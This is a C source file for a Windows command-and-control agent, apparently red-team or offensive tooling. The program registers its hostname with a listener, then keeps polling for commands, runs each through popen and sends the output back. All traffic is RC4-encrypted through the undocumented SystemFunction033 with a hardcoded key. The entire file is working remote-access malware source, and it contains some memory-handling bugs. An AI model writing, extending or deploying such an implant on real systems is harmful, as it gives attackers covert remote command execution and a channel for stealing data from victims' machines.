#include <stdio.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment (lib, "Advapi32.lib")
// we include Advapi32 to use the SystemFunction033 undocumented function
// that performs RC4 encryption for us


#ifndef LISTENERS
#define LISTENERS {"127.0.0.1", "192.168.56.1"}
#endif

#ifndef LISTENERS_AMOUNT
#define LISTENERS_AMOUNT 2
#endif

#ifndef PORT
#define PORT 13337
#endif

#ifndef SLEEPTIME
#define SLEEPTIME 2000
#endif

#ifndef SECRETKEY
#define SECRETKEY "ArgosRc4Key"
#endif

#define LEN_MSG 512
#define LEN_ID 36
#define INFO_BUFFER 512

/*
 * STRUCT AND NTDLL FUNCTION TYPE DEFINITION
 */
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    unsigned char* Buffer;
} USTRING;

/*
 * CORE FUNCTIONS
 */
BOOL Rc4Encryption(char* data, DWORD dataSize) {
    USTRING Data = {
        .Buffer         = data,
        .Length         = dataSize,
        .MaximumLength  = dataSize
    };

    USTRING	Key = {
        .Buffer         = SECRETKEY,
        .Length         = strlen(SECRETKEY),
        .MaximumLength  = strlen(SECRETKEY)
    };

    NTSTATUS result	= SystemFunction033(&Data, &Key);
    if (result != 0x0) {
        printf("[!] SystemFunction033 FAILED With Error: 0x%XX \n", result);
        return FALSE;
    }

    return TRUE;
}


SOCKET connectToServer() {
    SOCKET serverSocketFd;
    struct sockaddr_in serverHost;
    WSADATA WSAData;

    WSAStartup(MAKEWORD(2,0), &WSAData);

    serverSocketFd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocketFd == INVALID_SOCKET) {
        printf("Error while creating socket. (%d)\n", WSAGetLastError());
        closesocket(serverSocketFd);  // is this right ? i don't know it might make a segfault
        return SOCKET_ERROR;
    }

    char hosts[LISTENERS_AMOUNT][16] = LISTENERS;
    int randomHost = rand() % LISTENERS_AMOUNT;

    printf("\nChoose %s for this exchange.\n", hosts[randomHost]);
    serverHost.sin_family = AF_INET;
    serverHost.sin_port = htons(PORT);  // to little endian
    serverHost.sin_addr.s_addr = inet_addr(hosts[randomHost]);

    int result = connect(serverSocketFd, (SOCKADDR *) &serverHost, sizeof(serverHost));
    if (result == SOCKET_ERROR) {
        printf("Error while creating socket. (%d)\n", WSAGetLastError());
        closesocket(serverSocketFd);
        return SOCKET_ERROR;
    }

    u_long mode = 1;
    ioctlsocket(serverSocketFd, FIONBIO, &mode);

    return serverSocketFd;
}


int pull(char* message) {
    SOCKET serverFd = connectToServer();
    if (serverFd == SOCKET_ERROR) {
        WSACleanup();
        return WSAGetLastError();
    }

    Sleep(10);  // Sleeping for 10 milliseconds to let the tcp connection complete before reading
                // so we avoid errors like WOULDBLOCK.
    int readBytes = recv(serverFd, message, LEN_MSG, 0);
    if (readBytes < 0) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }

    Rc4Encryption(message, readBytes);
    closesocket(serverFd);
    return 0;
}


int sendData(char* message) {
    SOCKET serverFd = connectToServer();
    int dataSize = strlen(message);
    char* encData_h = malloc(dataSize);

    if (serverFd == SOCKET_ERROR) {
        WSACleanup();
        return WSAGetLastError();
    }

    strcpy(encData_h, message);
    Rc4Encryption(encData_h, dataSize);

    int byteSent = send(serverFd, encData_h, dataSize, 0);
    if (byteSent != dataSize) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }

    closesocket(serverFd);
    free(encData_h);
    encData_h = NULL;
    return 0;
}


int sendAndGetResponse(char* sendData, char* response) {
    SOCKET serverFd = connectToServer();
    int dataSize = strlen(sendData);
    char* encData_h = malloc(dataSize);


    if (serverFd == SOCKET_ERROR) {
        WSACleanup();
        return WSAGetLastError();
    }

    strcpy(encData_h, sendData);
    Rc4Encryption(encData_h, dataSize);
    int byteSent = send(serverFd, encData_h, dataSize, 0);
    if (byteSent != dataSize) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }

    Sleep(1000);  // Sleeping for 1 second to let the tcp connection complete before reading

    int readBytes = recv(serverFd, response, LEN_MSG, 0);
    if (readBytes < 0) {
        closesocket(serverFd);
        WSACleanup();
        return WSAGetLastError();
    }
    Rc4Encryption(response, readBytes);

    closesocket(serverFd);
    free(encData_h);
    encData_h = NULL;
    return 0;
}


char* execute(char* command) {
    FILE* exec = popen(command, "r");
    if (exec == NULL) {
        return NULL;
    }

    char currLine[256] = { 0x00 };

    // this var will store the entire output. Since we don't know the size of the output
    // yet, we create an empty dynamic string.
    char* response_h = malloc(0);
    response_h[0] = 0;

    size_t readBytes;
    size_t newSize;

    while ((readBytes = fread(currLine, 1, sizeof(currLine), exec)) != 0x00) {
        // each time there's something to read, we update the new size of the response_h buffer
        // current + new data + 1. 1 is for the null byte we add at the end of it.
        // The null byte will be overwritten next loop or stays if the loops ends.
        newSize = strlen(response_h) + readBytes + 1;

        // potential memory leak if realloc return NULL because we lose access to the original
        // response_h buffer. It's not a problem since we're exiting if it can't allocate space
        // (should never happen, if it happens there's shit going on)
        response_h = realloc(response_h, newSize);
        if (response_h == NULL) {
            return NULL;
        }

        // Note: strcpy would do the job here
        strncpy(response_h + strlen(response_h), currLine, readBytes);
        response_h[newSize - 1] = 0x0;
    }

    pclose(exec);
    return response_h;
}


int main() {
    srand(time(NULL));
    
    char agent_id[LEN_ID + 2] = "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:";
    char* hostname_h = execute("hostname");
    char test_Host[INFO_BUFFER];
    

    size_t intro_h_size = LEN_ID + 1 + strlen(hostname_h);  // +1 for ':'
    char* intro_h = malloc(intro_h_size);
    strncpy(intro_h, agent_id, LEN_ID);
    intro_h[LEN_ID] = ':';
    strncpy(intro_h + LEN_ID + 1, hostname_h, strlen(hostname_h));
    intro_h[intro_h_size] = 0x00;

    char new_id[LEN_ID + 1] = "";
    while (strcmp(new_id, "") == 0) {
        int error = sendAndGetResponse(intro_h, new_id);
        if (error != 0) {
            printf("Error while introducing ourselves. (%d) Retrying", error);
            new_id[0] = 0x00;
            continue;
        }
        Sleep(1000);
    }

    strncpy(agent_id, new_id, LEN_ID);

    free(hostname_h);
    hostname_h = NULL;

    free(intro_h);
    intro_h = NULL;

    char message[LEN_MSG] = { 0x0 };

    while (1) {
        int error = sendAndGetResponse(agent_id, message);
        if (error != 0) {
            printf("Error while pulling data. (%d)", error);
            exit(EXIT_FAILURE);
        }

        printf("Received %s\n", message);

        if (strcmp(message, "") != 0) {
            char* commandStart = message;
            for (int i = 0; i < strlen(message); i++) {
                if (message[i] != ':') {
                    commandStart++;
                    continue;
                }
                commandStart++;
                message[i] = 0x00;
                break;
            }

            char* commandId = message;

            char* command_h = execute(commandStart);
            if (command_h == NULL) {
                // if we reach this point, there's some shit going on.
                printf("Could not execute command.");
                exit(EXIT_FAILURE);
            }

            size_t formatedOutputLen = strlen(agent_id) + strlen(commandId) + 1 + strlen(command_h);
            char* formatedOutput_h = malloc(formatedOutputLen);
            strncpy(formatedOutput_h, agent_id, strlen(agent_id));
            strncpy(formatedOutput_h + strlen(agent_id), commandId, strlen(commandId));
            strncpy(formatedOutput_h + strlen(agent_id) + strlen(commandId), ":", 1);
            strncpy(formatedOutput_h + strlen(agent_id) + strlen(commandId) + 1, command_h, strlen(command_h));
            formatedOutput_h[formatedOutputLen] = 0x00;
            
            error = sendData(formatedOutput_h);
            if (error != 0) {
                printf("Error while sending data. (%d)", error);
                exit(EXIT_FAILURE);
            }

            free(formatedOutput_h);
            formatedOutput_h = NULL;

            free(command_h);
            command_h = NULL;
        }

        memset(message, 0x00, sizeof(message));
        Sleep(SLEEPTIME);
    }
}
